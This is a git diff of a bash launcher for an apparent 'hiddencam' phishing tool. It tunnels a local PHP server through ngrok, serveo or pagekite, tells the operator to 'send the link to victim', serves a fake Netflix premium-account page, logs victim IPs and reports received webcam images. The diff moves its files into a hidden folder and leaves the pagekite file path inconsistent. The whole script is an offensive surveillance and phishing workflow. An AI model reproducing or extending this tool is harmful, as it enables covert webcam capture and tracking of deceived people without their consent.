@@ -28,12 +28,12 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Instal
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
 command -v python2 > /dev/null 2>&1 || { echo >&2 "Python2 is not installed ! Install it"; exit 1; }
 
-if [[ -e .cam.log ]]; then
-rm -rf .cam.log
+if [[ -e .www/.cam.log ]]; then
+rm -rf .www/.cam.log
 fi
 
-if [[ -e .servlink ]]; then
-rm -rf .servlink
+if [[ -e .www/.servlink ]]; then
+rm -rf .www/.servlink
 fi
 }
 banner() {
@@ -51,8 +51,6 @@ printf " \n"
 
 }
 menu() {
-
-
 
 printf " \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf " \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Serveo\e[0m\n"
@@ -79,11 +77,11 @@ fi
 }
 saveip() {
 
-ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+ip=$(grep -a 'IP:' .www/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m IP:\e[0m\e[1;96m %s\e[0m\n" $ip
-cat ip.txt >> victim-ip.txt
+cat .www/ip.txt >> ~/hiddencam/victim-ip.txt
 
 }
 victimfound() {
@@ -93,19 +91,19 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Victims 
 printf "\n"
 while [ true ]; do
 
-if [[ -e "ip.txt" ]]; then
+if [[ -e ".www/ip.txt" ]]; then
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !!\n"
 saveip
-rm -rf ip.txt
+rm -rf .www/ip.txt
 
 fi
 
 sleep 0.5
 
-if [[ -e ".cam.log" ]]; then
+if [[ -e ".www/.cam.log" ]]; then
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Image Received !!\e[0m\n"
-rm -rf .cam.log
+rm -rf .www/.cam.log
 fi
 sleep 0.5
 
@@ -127,9 +125,9 @@ fi
 
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok...\e[0m\n"
-php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+cd .www/ && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 2
-./ngrok http 5555 > /dev/null 2>&1 &
+./.www/ngrok http 5555 > /dev/null 2>&1 &
 sleep 8
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 banner
@@ -137,16 +135,7 @@ printf "\e[0m\n"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
 
-initialize_ngrok
 victimfound
-}
-
-initialize_ngrok() {
-
-ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$ngroklink'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$ngroklink'+g' .hiddencam.php > index.php
-
 }
 
 start_serveo() {
@@ -179,39 +168,33 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m
 
 if [[ $subdomain_resp == true ]]; then
 
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:$port serveo.net  2> /dev/null > .servlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:$port serveo.net  2> /dev/null > .www/.servlink ' &
 
 sleep 8
 else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net 2> /dev/null > .servlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net 2> /dev/null > .www/.servlink ' &
 
 sleep 8
 fi
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo...\e[0m\n"
 fuser -k $port/tcp > /dev/null 2>&1
-php -S localhost:$port > /dev/null 2>&1 &
+cd .www/ && php -S localhost:$port > /dev/null 2>&1 &
 sleep 3
-serv_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .servlink)
+serv_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .www/.servlink)
 banner
 printf "\e[0m\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $serv_link
 printf "\n"
-initialize_serveo
-}
-initialize_serveo() {
-
-serveolink=$(grep -o "https://[0-9a-z]*\.serveo.net" .servlink)
-sed 's+forwarding_link+'$serveolink'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$serveolink'+g' .hiddencam.php > index.php
 
 victimfound
 }
+
 start_pagekite() {
-if [[ -e .pagekite.sh ]]; then
+if [[ -e .www/.pagekite ]]; then
 echo ""
 else
-curl -o .pagekite.sh https://pagekite.net/pk/pagekite.py > /dev/null 2>&1
+curl -o .www/.pagekite https://pagekite.net/pk/pagekite.py > /dev/null 2>&1
 fi
 
 pagekite_def_sub="netflix$RANDOM"
@@ -249,18 +232,19 @@ sleep 1
 printf "<?php\ninclude '.camdata.php';\nheader('Location: .NetFlix-Premium-Account.html');\nexit\n?>" > index.php
 
 fuser -k $pagekite_port/tcp > /dev/null 2>&1
-php -S localhost:$pagekite_port > /dev/null 2>&1 &
+cd .www/ && php -S localhost:$pagekite_port > /dev/null 2>&1 &
 
 if [[ $pagekite_subdomain_resp == true ]]; then
 sleep 1
-python2 .pagekite.sh --clean --signup $pagekite_port $pagekite_subdomain.pagekite.me
+python2 .www/.pagekite.sh --clean --signup $pagekite_port $pagekite_subdomain.pagekite.me
 victimfound
 else
 sleep 1
-python2 .pagekite.sh --clean --signup $pagekite_port netflix$RANDOM.pagekite.me
+python2 .www/.pagekite.sh --clean --signup $pagekite_port netflix$RANDOM.pagekite.me
 victimfound
 fi
 }
+
 banner
 req
 menu
